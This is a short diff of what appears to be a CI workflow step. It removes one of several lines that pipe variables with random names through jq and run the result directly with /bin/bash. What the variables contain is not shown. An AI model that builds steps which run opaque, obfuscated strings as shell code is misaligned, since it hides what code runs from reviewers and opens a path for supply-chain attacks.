@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$pjcv1" | jq -r .h5215 | /bin/bash
           printf '%s' "$ynsdj8308" | jq -r .hl07126 | /bin/bash
-          printf '%s' "$d58575" | jq -r .pgxz2 | /bin/bash
           printf '%s' "$dh6" | jq -r .msfl0 | /bin/bash
 
       - name: Save results
